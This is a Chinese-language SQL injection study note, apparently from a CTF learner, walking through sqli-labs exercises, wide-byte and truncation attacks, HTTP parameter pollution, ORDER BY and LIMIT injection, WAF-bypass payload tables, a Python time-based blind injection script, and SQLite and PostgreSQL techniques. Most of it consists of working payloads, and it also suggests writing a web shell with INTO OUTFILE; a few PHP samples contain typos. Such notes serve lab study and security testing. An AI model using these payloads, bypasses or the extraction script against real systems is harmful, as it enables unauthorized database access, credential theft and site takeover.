31、Via： 列出从客户端到OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前个代理服务器的请求的Via 头部，并把自己的相关信息加到后面，以此类推，当OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)

**sqli-labs/less18**

从代码中看到

```mysql
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent','$IP', $uname)";
```

将useragent 和ip 插入到数据库中，那么我们是不是可以用这个来进行注入呢？

将`user-agent` 修改为`'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1;`

## 基于程度和顺序的注入(哪里发生了影响)

### 一阶注射

### 二阶注射

一阶注射是指输入的注射语句对WEB 直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB 应用程序产生影响，通过其它的辅助间接的对WEB 产生危害，这样的就被称为是二阶注入.

**sqli-labs/Less-24**

二次排序注入思路：

1.  黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。
2.  服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。
3.  黑客向服务端发送第二个与第一次不相同的请求数据信息。
4.  服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服务端环境中执行。
5.  服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。此例子中我们的步骤是注册一个admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是admin 的密码。Sql 语句变为UPDATE users SET passwd="New\_Pass" WHERE username =' admin' # ' AND password=' ， 也就是执行了UPDATE users SET passwd="New\_Pass" WHERE username ='admin'

步骤演示：  
（1）初始数据库为

![image-20210201131530267](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210201131540.png)

（2）注册admin’#账号

![image-20210201131921540](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210201135619.png)

注意此时的数据库中出现了admin’#的用户，同时admin 的密码为123

（4）登录admin’#，并修改密码

![image-20210201132113418](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210201135610.png)

可以看到admin 的密码已经修改为1111

## 服务器（两层）架构

![image-20210201135602122](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210201135604.png)

服务器端有两个部分：第一部分为tomcat 为引擎的jsp 型服务器，第二部分为apache为引擎的php 服务器，真正提供web 服务的是php 服务器。工作流程为：client 访问服务器，能直接访问到tomcat 服务器，然后tomcat 服务器再向apache 服务器请求数据。数据返回路径则相反。

重点：index.php?id=1&id=2，你猜猜到底是显示id=1 的数据还是显示id=2 的？

Explain：apache（php）解析最后一个参数，即显示id=2 的内容。Tomcat（jsp）解析第一个参数，即显示id=1 的内容。

![image-20210201135716511](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210201135722.png)

以上图片为大多数服务器对于参数解析的介绍。  
此处我们想一个问题：index.jsp?id=1&id=2 请求，针对第一张图中的服务器配置情况，客户端请求首先过tomcat，tomcat 解析第一个参数，接下来tomcat 去请求apache（php）服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？Answer：此处应该是id=2 的内容，应为时间上提供服务的是apache（php）服务器，返回的数据也应该是apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF 的检测。该用法就是HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。

## 宽字节注入

在了解宽字节注入之前，我们先来看一看字符集是什么。  
字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。  
几种常见的字符集：  
`ASCII`编码：单字节编码  
`latin1`编码：单字节编码  
`gbk`编码：使用一字节和双字节编码，`0x00-0x7F`范围内是一位，和`ASCII` 保持一致。双字节的第一字节范围是`0x81-0xFE`  
`UTF-8`编码：使用一至四字节编码，`0x00–0x7F`范围内是一位，和`ASCII` 保持一致。其它字符用二至四个字节变长表示。

宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。  
通常来说，一个`gbk`编码汉字，占用2个字节。一个`utf-8`编码的汉字，占用3个字节。

宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了`SET NAMES 'gbk'` 或是`SET character_set_client =gbk`，这样配置会引发编码转换从而导致的注入漏洞。

```php
$conn->query("set names 'gbk';");
```

### GBK编码

```php
<?php

    $conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    } $
    conn->query("set names 'gbk';");
    $username = addslashes(@$_POST['username']);//非常安全的转义函数
    $password = addslashes(@$_POST['password']);
    $sql = "select * from users where username = '$username' and password='$password';";
    $rs = mysqli_query($conn,$sql);
    echo $sql.'<br>';
    if($rs->fetch_row()){
        echo "success";
    }else{
        echo "fail";
} ?>
用户名输入：admin' or 1=1#
转义后为： admin\' or 1=1#
执行语句：... where username='admin\' or 1=1#'

用户名输入：admin%df' or 1=1#
转义后为： admin%df\' or 1=1#
SET character_set_client ='gbk'后：admin運' or 1=1#
执行语句：... where username='admin運' or 1=1#'
```

`%df` 吃掉`\` 具体的原因是`urlencode(\')` \= `%5c%27`，我们在`%5c%27` 前面添加`%df`，形成`%df%5c%27`，而上面提到的mysql 在GBK 编码方式的，第一位范围为`0x00-0x7F`时，当作一个字符。`%df`不在这个范围内，因此会将两个字节当做一个汉字，此事`%df%5c` 就是一个汉字，`%27` 则作为一个单独的符号在外面，同时也就达到了我们的目的。

### Latin1编码

```php
$mysqli = new mysqli( "localhost","root","root","cat");
if($mysqli->connect_errno){
    printf("failed: %s\n", Smysqli->connect_error);
    exit();
}
$mysqli->query("set names utf8");
$username= addslashes($_GET['username']);
//我们在其基础上添加这么一条语句。
if($username === 'admin'){
    die("You can't do this");
}

$sqL= "SELECT * FROM `table1` WHERE username='{$username}'";
if($result = $mysqli->query($sql)){
    printf("select returned %d rous.\n",$resule->num_rows);
    while ($row = $result->fetch_ array(MYSQLI_ASSOC))
    {
        var_ dump($row);      
    }
    $resule->close();
}else{
    var_dump($mysqli->error);
}
$mysqli->close();
?>
```

SQL语句会先转成`character_set_client`设置的编码。但他接下来还会继续转换。`character_set_client`客户端层转换完毕之后，数据将会交给`character_set_connection`连接层处理，最后在从`character_set_connection`转到数据表的内部操作字符集。

字符集的转换为：`UTF-8—>UTF-8->Latin1`

UTF-8编码是变长编码，可能有1~4个字节表示：

• 一字节时范围是`[00-7F]`  
• 两字节时范围是`[C0-DF][80-BF]`  
• 三字节时范围是`[E0-EF][80-BF][80-BF]`  
• 四字节时范围是`[F0-F7][80-BF][80-BF`\]\[80-BF\]  
然后根据`RFC 3629`规范，又有一些字节值是不允许出现在`UTF-8`编码中的：

所以最终，UTF-8第一字节的取值范围是：`00-7F`、`C2-F4`。

输入：`?username=admin%c2`  
其中`%c2`是一个`Latin1`字符集不存在的字符。`%00-%7F`可以直接表示某个字符、`%C2-%F4`不可以直接表示某个字符而只是其他长字节编码结果的首字节。

对于不完整的长字节UTF-8编码的字符，进行字符集转换时会直接忽略，所以`admin%c2`会变成`admin`

## 约束攻击

当数据库字符串长度过短，并且后端没有对字符串进行长度限制时

```mysql
CREATE TABLE users(
    username varchar(20),
    password varchar(20)
)
```

漏洞代码逻辑如下：

代码由登录和注册构成。

1.用`select * from table where username='$username'`检测你输入的用户名，如果存在，说明你注册过，那么不让你注册。

2.用户名不存在，用`insert into table values('$username','$password')`把你输入的用户名密码插入数据库。

`insert`和`select`语句执行不一样造成

`INSERT`语句：截取前20个字符  
`SELECT`语句：输入什么就是什么

当我们注册时字符串长度超过20，那么使用`select`检测时就会不存在，那么就使用`insert`插入，这时候由于长度超过20，截取前20个字符。

注册`admin a` -> `SELECT`认为不存在-> `INSERT`了前20位-> 使用自己注册的`admin`和对应密码进行登录~

```mysql
INSERT插入了admin+15空格，实际上是插入了admin，末尾的空格会被MySQL忽略掉
```

这样就修改了`admin`的密码了

## order by 后的injection

### order by参数后注入

从本关开始，我们开始学习order by 相关注入的知识。本关的sql 语句为$sql = "SELECT \* FROM users ORDER BY $id";尝试?sort=1 desc 或者asc，显示结果不同，则表明可以注入。（升序or 降序排列）从上述的sql 语句中我们可以看出，我们的注入点在order by 后面的参数中，而order by不同于的我们在where 后的注入点，不能使用union 等进行注入。如何进行order by 的注入，我们先来了解一下mysql 官方select 的文档。

```mysql
SELECT 
    [ALL | DISTINCT | DISTINCTROW ] 
      [HIGH_PRIORITY] 
      [STRAIGHT_JOIN] 
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
    select_expr [, select_expr ...] 
    [FROM table_references 
    [WHERE where_condition] 
    [GROUP BY {col_name | expr | position} 
      [ASC | DESC], ... [WITH ROLLUP]] 
    [HAVING where_condition] 
    [ORDER BY {col_name | expr | position} 
      [ASC | DESC], ...] 
    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
    [PROCEDURE procedure_name(argument_list)] 
    [INTO OUTFILE 'file_name' export_options 
      | INTO DUMPFILE 'file_name' 
      | INTO var_name [, var_name]] 
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

我们可利用order by 后的一些参数进行注入。

（1）、order by 后的数字可以作为一个注入点。也就是构造order by 后的一个语句，让该语句执行结果为一个数，我们尝试

```mysql
http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1)
```

没有报错，但是right 换成left 都一样，说明数字没有起作用，我们考虑布尔类型。此时我们可以用报错注入和延时注入。此处可以直接构造?sort= 后面的一个参数。此时，我们可以有三种形式，

+   直接添加注入语句，?sort=(select **\*\***)

+   利用一些函数。例如rand()函数等。?sort=rand(sql 语句)  
    Ps：此处我们可以展示一下rand(ture)和rand(false)的结果是不一样的。

```mysql
http://127.0.0.1/sqli-labs/Less-46/?sort=rand(false)
```

![image-20210201143400000](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210201143404.png)

```mysql
http://127.0.0.1/sqli-labs/Less-46/?sort=rand(true)
```

![image-20210201143447825](https://cdn.jsdelivr.net/gh/cc-sql/imagbed/img/20210201143450.png)

+   利用and，例如?sort=1 and (加sql 语句)。

同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。

```mysql
http://127.0.0.1/sqli-labs/Less-46/?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
```

接下来我们用rand()进行演示一下，因为上面提到rand(true)和rand(false)结果是不一样的。

```mysql
http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=115)
http://127.0.0.1/sqli-labs/Less-46/?sort=rand(ascii(left(database(),1))=116)
从上述两个图的结果，对比rand(ture)和rand(false)的结果，可以看出报错注入是成功的。
```

延时注入例子

```mysql
http://127.0.0.1/sqli-labs/Less-46/?sort= (SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)
http://127.0.0.1/sqli-labs/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))
```

同时也可以用?sort=1 and 后添加注入语句。

### procedure analyse 参数后注入

此方法适用于MySQL 5.x中，在limit语句后面的注入

利用procedure analyse 参数，我们可以执行报错注入。同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入。

```mysql
http://127.0.0.1/sqli-labs/Less-46/?sort=1  procedure analyse(extractvalue(rand(),con
cat(0x3a,version())),1)
//SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
如果不支持报错注入的话，还可以基于时间注入：
//SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

### 导入导出文件into outfile 参数

```mysql
http://127.0.0.1/sqli-labs/Less-46/?sort=1 into outfile "c:\\wamp\\www\\sqllib\\test
1.txt"
将查询结果导入到文件当中
那这个时候我们可以考虑上传网马，利用lines terminated by
Into outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行16 进制转
换)
```

## 绕过过滤

### 空格被过滤

```auto
/**/替代空格
%09 TAB 键（水平）
%0a 新建一行
%0c 新的一页
%0d return 功能
%0b TAB 键（垂直）
%a0 空格
() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。
```

%a0�

这个可算是一个不成汉字的中文字符了，那这应该就好理解了，因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤

### 过滤单引号

当在登录时使用的是如下SQL语句：

```mysql
select user from user where user='$_POST[username]' and password='$_POST[password]';
```

在这里单引号被过滤了，但是反斜杠`\`并没有被过滤。则单引号可以被转义

输入的用户名以反斜杠`\`结尾

```mysql
username=admin\&password=123456#
将这个拼接进去，\就可以将第2个单引号转义掉
select * from users where username='admin\' and password='123456#';
这样第1个单引号就会找第3个单引号进行闭合，后台接收到的username实际上是admin\' and password=这个整体
接下来构造password为or 2>1#
select * from users where username='admin\' and password=' or 2>1#';
上面的语句会返回为真，通过这样的思路，我们就可以进行bool盲注
```

### 注释符

```mysql
//
--%20
/**/
#
--+
-- -
%00
;
;%00
;\x00
```

### 大小写绕过

### 双写绕过

### 编码绕过

利用urlencode，ascii(char)，hex，unicode等编码绕过

```mysql
or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。

十六进制编码

SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

双重编码绕过

?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+

一些unicode编码举例：    
单引号：'
%u0027 %u02b9 %u02bc
%u02c8 %u2032
%uff07 %c0%27
%c0%a7 %e0%80%a7
空白：
%u0020 %uff00
%c0%20 %c0%a0 %e0%80%a0
左括号(:
%u0028 %uff08
%c0%28 %c0%a8
%e0%80%a8
右括号):
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9
```

### like绕过

```mysql
?id=1' or 1 like 1#
可以绕过对 = > 等过滤
```

### in绕过

```mysql
or '1' IN ('1234')#
可以替代=
```

### 等价函数或变量

```auto
hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring()和substr()无法使用时：?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74　

或者：
substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
```

### 反引号绕过

```mysql
select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
```

### 过滤union

```mysql
waf = 'and|or|union'
过滤代码 union select user,password from users
绕过方式 1 && (select user from users where userid=1)='admin'
```

### 过滤where

```mysql
waf = 'and|or|union|where'
过滤代码 1 && (select user from users where user_id = 1) = 'admin'
绕过方式 1 && (select user from users limit 1) = 'admin'
```

### 过滤limit

```mysql
waf = 'and|or|union|where|limit'
过滤代码 1 && (select user from users limit 1) = 'admin'
绕过方式 1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin
```

### 过滤group by

```mysql
waf = 'and|or|union|where|limit|group by'
过滤代码 1 && (select user from users group by user_id having user_id = 1) = 'admin'
绕过方式 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
```

### 过滤select

```mysql
waf = 'and|or|union|where|limit|group by|select'
过滤代码 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
只能查询本表中的数据
绕过方式 1 && substr(user,1,1) = 'a'
```

mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。

```mysql
handler users open as hd; #指定数据表进行载入并将返回句柄重命名
handler hd read first; #读取指定表/句柄的首行数据
handler hd read next; #读取指定表/句柄的下一行数据
handler hd close; #关闭句柄
```

### 过滤’(单引号)

```mysql
waf = 'and|or|union|where|limit|group by|select|\''
过滤代码 1 && substr(user,1,1) = 'a'
绕过方式 1 && user_id is not null    1 && substr(user,1,1) = 0x61    1 && substr(user,1,1) = unhex(61)
```

### 过滤hex

```mysql
waf = 'and|or|union|where|limit|group by|select|\'|hex'
过滤代码 1 && substr(user,1,1) = unhex(61)
绕过方式 1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。
```

### 过滤substr

```mysql
waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'
过滤代码 1 && substr(user,1,1) = lower(conv(11,10,16)) 
绕过方式 1 && lpad(user(),1,1) in 'r'
```

### 过滤`,`逗号

```mysql
//过滤了逗号怎么办？就不能多个参数了吗？
SELECT SUBSTR('2018-08-17',6,5);与SELECT SUBSTR('2018-08-17' FROM 6 FOR 5);
意思相同
substr支持这样的语法：
SUBSTRING(str FROM pos FOR len)
SUBSTRING(str FROM pos)
MID()后续加入了这种写法
```

## 常用Payload总结

```mysql
//联合查询
//获取当前数据库的表名
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
//获取表中的字段名
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
//查询数据
1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
//如果group_concat被过滤了，而又只能返回一条数据，则用limit 0,1

//布尔盲注脚本
import requests as req
import time as t
import string

url = "xxx"

select = "select group_concat(table_name) from information_schema.tables where binary table_schema in (select databases())"
select = "select group_concat(column_name) from information_schema.columns where binary table_name in ('xxxx') "
select = "select group_concat(xxxx) from xxxxxxx"
res = ""

def text2hex(s):
    res = ""
    for i in s:
        res +=hex(ord(i)).replace("0x", "")
    return "0x" + res

for i in range(1,50):
    for ascii in string.printable:
        if ascii == '\\': #转义符号没有意义
            continue
        data = {
            "username" : "admin",
            "password" : f"123' or if((binary right(({select},{i}) in ({text2hex(ascii+res)})),(select benchmark(15000000.sha1(sha(sha(1)))) in (0)),0)#".replace(" ", "/**/")
        }
        start = int(t.time())
        r = req.post(url=url, data=data)
        end = int(t.time()) - start
        print(data)
        if end > 4:
            res = ascii +res
            print(res)
            break
        if ascii == string.printable[-1:]:
            exit(0)
```

# Sqlite注入

## 注释符

```sqlite
/**/
--
两种注释符 --后面不带空格 
```

可以用于判断数据库类型

`#`如果不生效的话则说明不是`mysql`

## sqlite系统库

```sqlite
--先创建两个表
CREATE TABLE GIFT(
ID INT PRIMARY KEY NOT NULL,
ITEM TEXT NOT NULL,
LOG TEXT NOT NULL
);

CREATE TABLE SECRET(
ID INT NOT NULL,
fl4ggg TEXT PRIMARY KEY NOT NULL
);

INSERT INTO GIFT (ID,ITEM,LOG) VALUES (1, "Turkey", "Most British families like
to cook their own turkey. A large number of vegetables and fruits, such as
asparagus, celery, onions and chestnuts, are stuffed into the belly of a ten
pound turkey, and then coated with a variety of spices before being baked in
the oven.");
INSERT INTO SECRET (id,fl4ggg) VALUES (1, "flag{Y1ng}");
```

在`mysql`中查询库名、表名等有系统数据库`information_schema`，而在`sqlite`中则是表`sqlite_master`

```sqlite
sqlite> .schema sqlite_master
CREATE TABLE sqlite_master (
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);
```

```sqlite
--查询表名
sqlite> SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';
GIFT
SECRET
--注：这里之所以使用NOT like 'sqlite_%'，是避免出来系统的表，但是可能题目故意将表名弄成sqlite开头

--查询列名
sqlite> SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='GIFT';
CREATE TABLE GIFT(
ID INT PRIMARY KEY NOT NULL,
ITEM TEXT NOT NULL,
LOG TEXT NOT NULL
)
sqlite> SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='SECRET';
CREATE TABLE SECRET(
ID INT NOT NULL,
fl4ggg TEXT PRIMARY KEY NOT NULL
)
```

## 字符串截取

与`mysql`类似，`sqlite`中也有字符串截取的函数

`substr()、substring()、like、=、>、<、in、between`，这些与`mysql`差不多

而`sqlite`特有的

**TRIM**

```sqlite
TRIM (字符串,要移除的字符) 如果要移除的字符不写，默认是空格
LTRIM 字符串开头部分移除
RTRIM 字符串结尾部分移除
--这个函数与mysql中的TRIM用法不一样

sqlite> select trim('aaaadsd','a');
dsd
sqlite> select trim('aaaadsda','a');
dsd
可以通过特定的trim构造，实现right()和left()的功能
sqlite> select ltrim('casdasd','a') = ltrim("casdasd","c");
0
--通过ltrim去除字符与后一个trim判断相等，确定字符
```

**printf(FORMAT,...)**

```sqlite
sqlite> select printf('%.1s','aaaaa');
a
sqlite> select printf('%.2s','aaaaa');
aa
sqlite> select printf('%.3s','aaaaa');
aaa

--通过printf函数格式化操作对字符串截取
```

通过`printf`判断长度

```sqlite
--如果printf('%.is', 'abc')=printf('%.i+1s', 'abc') 则说明字符串长度为i

sqlite> select printf('%.5s','aaaaa') = printf('%.6s','aaaaa');
1
```

## 比较

**GLOB**

运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，GLOB 运算符将返回1。与LIKE 运算符不同的是，**GLOB 是大小写敏感的**，对于下面的通配符，它遵循UNIX 的语法。

+ 星号`*`

+ 问号`?`

  星号`*`代表零个、一个或多个数字或字符。问号`?`代表一个单一的数字或字符。这些符号可以被组合使用。

**LIKE**

**LIKE** 运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，LIKE 运算符将返回真（true），也就是 1。这里有两个通配符与 LIKE 运算符一起使用

+ 百分号`%`

+ 下划线`_`

  百分号（%）代表零个、一个或多个数字或字符。下划线（\_）代表一个单一的数字或字符。这些符号可以被组合使用。

## 条件判断

+   `case when X then Y else Z end` 这个语句和`mysql`是相同的
+   `iif(X,Y,Z)`

注意:

1.  `sqlite`中没有`if`语句
2.  `iif`只有`version>=3.32`可用

```sqlite
sqlite> select case when (1=1) then 1 else 0 end;
1
sqlite> select case when (1=2) then 1 else 0 end;
0

--iif函数使用的版本比较高
```

## 构造报错

在`mysql`中可以使用`exp(999999)`报错，但是`sqlite`中没有

在`sqlite`中使用`randomblob(N)`：返回`N-byte blob`

```sqlite
sqlite> select randomblob(1);

sqlite> select randomblob(2);
�`
sqlite> select randomblob(3);
~��
sqlite> select randomblob(4);
�2q�
--随机返回N个字节的字符
--转化为十六进制看看
sqlite> select hex(randomblob(4));
F8896FC0

--当长度过长时报错
sqlite> select randomblob(10000000000);
Error: string or blob too big
```

## 时间盲注

`sqlite`中并没有`sleep()`这样的延时函数，通过`like`匹配和`RANDOMBLOB`组合延时

```sqlite
-- 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([秒]00000000/2))))

sqlite> select 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))));
0

--虽然没有像sleep那样精确，但是也够用了
```

## SQLi-Quine

在做CTF时可能遇见数据库里没有东西，但是却要求输入的与数据库查询的内容相等

```js
row = db.prepare(`select pw from users where id='admin' and pw='${user.pw}'`).get();
if(typeof row !== "undefined"){
    req.session.isAdmin = (row.pw === user.pw);
}else{
    req.session.isAdmin = false;
}
```

上诉的`sql`语句要求输入的密码和查询的密码相等，在注入的过程中发现数据库没有东西。因此构造`payload`

```sqlite
Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')--

Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||

Payload  :' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--
Generates:' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--
```

```sqlite
sqlite> select ''Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||');

' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||

sqlite> select '' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--
   ...> ;

' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||' Union select replace(hex(zeroblob(2)),hex(zeroblob(1)), char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')||replace(hex(zeroblob(3)),hex(zeroblob(1)),char(39)||')--')--')--
```

参考题目：ASIS CTF Quals 2020 Admin Panel

生成脚本参考：[https://www.shysecurity.com/post/20140705-SQLi-Quine](https://www.shysecurity.com/post/20140705-SQLi-Quine)

# PostgreSQL注入

## 注释符

```plsql
/**/
--
两种注释符 --后面不带空格 
```

判断是`plsql`还是`sqlite`

```plsql
--可以注释，#不可注释，则不是mysql
利用exp(999999)构造报错，可判断是PostgreSQL
或者测试延时盲注利用pg_sleep()
postgres=# select 123 where 123 = exp(9999999);
ERROR:  value out of range: overflow
```

## LIKE注入

```plsql
string LIKE pattern [ESCAPE escape-character]
string NOT LIKE pattern [ESCAPE escape-character]
```

在LIKE 子句中，通常与通配符结合使用，通配符表示任意字符，在PostgreSQL 中，主要有以下两种通配符（如果没有使用通配符，LIKE 子句和等号= 一样）：

+   百分号`%`
+   下划线`_`

`_`匹配任意一个字符，`%`匹配0至多个任意字符。

下面是 LIKE 语句中演示了 **%** 和 **\_** 的一些差别:

| 实例                               | 描述                                                   |
| ---------------------------------- | ------------------------------------------------------ |
| WHERE SALARY::text LIKE '200%'     | 找出 SALARY 字段中以 200 开头的数据。                  |
| WHERE SALARY::text LIKE '%200%'    | 找出 SALARY 字段中含有 200 字符的数据。                |
| WHERE SALARY::text LIKE '\_00%'    | 找出 SALARY 字段中在第二和第三个位置上有 00 的数据。   |
| WHERE SALARY::text LIKE '2 *%* %'  | 找出 SALARY 字段中以 2 开头的字符长度大于 3 的数据。   |
| WHERE SALARY::text LIKE '%2'       | 找出 SALARY 字段中以 2 结尾的数据                      |
| WHERE SALARY::text LIKE '\_2%3'    | 找出 SALARY 字段中 2 在第二个位置上并且以 3 结尾的数据 |
| WHERE SALARY::text LIKE '2\_\_\_3' | 找出 SALARY 字段中以 2 开头，3 结尾并且是 5 位数的数据 |

在 PostgreSQL 中，LIKE 子句是只能用于对字符进行比较，因此在上面例子中，我们要将整型数据类型转化为字符串数据类型。

根据活动的语言环境，可以使用关键字`ILIKE`代替`LIKE`来使匹配不区分大小写。这不是 SQL 标准，而是 PostgreSQL 扩展。

如果匹配的字符串中包含特殊字符，使用`escape ''`来选择转义任何字符

```plsql
postgres=# select 'aaa%bbb' like 'aaa%';
 ?column?
----------
 t
(1 row)

postgres=# select 'aaa%bbb' like 'aaa1%' escape '1';
 ?column?
----------
 f
(1 row)

postgres=# select 'aaa%bbb' like 'aaa1%%' escape '1';
 ?column?
----------
 t
(1 row)

postgres=# select 'aaa%bbb' like 'aaa1%bb' escape '1';
 ?column?
----------
 f
(1 row)

postgres=# select 'aaa%bbb' like 'aaa1%bb_' escape '1';
 ?column?
----------
 t
(1 row)

--可以看到使用escape之后，将1当作转义符
```

如果`like`被过滤，可以使用`~~`

```plsql
postgres=# select '123' ~~ '1%';
 ?column?
----------
 t
(1 row)
```

运算符`~~`等效于`LIKE`，而`~~*`对应于`ILIKE`。还有`!~~`和`!~~*`运算符分别代表`NOT LIKE`和`NOT ILIKE`。所有这些运算符都是特定于 PostgreSQL 的。您可能会在`EXPLAIN`输出和类似的位置看到这些运算符名称，因为解析器实际上翻译了`LIKE`等。这些运算符。

